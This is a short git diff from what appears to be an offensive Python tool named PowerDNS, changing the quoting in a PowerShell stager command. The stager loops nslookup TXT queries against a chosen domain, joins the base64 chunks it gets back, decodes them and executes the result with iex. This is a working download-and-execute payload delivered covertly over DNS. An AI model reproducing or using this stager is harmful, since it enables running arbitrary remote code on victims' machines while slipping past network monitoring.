@@ -114,7 +114,7 @@ if __name__ == '__main__':
         domain = args.domain
         timeout = args.timeout
         interface = args.interface
-        STAGER_CMD = 'for ($i=1;$i -le {};$i++){{$b64+=iex(nslookup -q=txt -timeout={} "$i.{}")[-1]}};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))'.format(str(len(chunks)), timeout, domain)
+        STAGER_CMD = 'for ($i=1;$i -le {};$i++){{$b64+=iex(nslookup -q=txt -timeout={} $i\'.{}\')[-1]}};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))'.format(str(len(chunks)), timeout, domain)
 
         print "\033[1;34m[*] PowerDNS:\033[0;0m Splitting {} in to {} chunk(s)".format(args.file, str(len(chunks)))
         chunks.insert(0, STAGER_CMD)
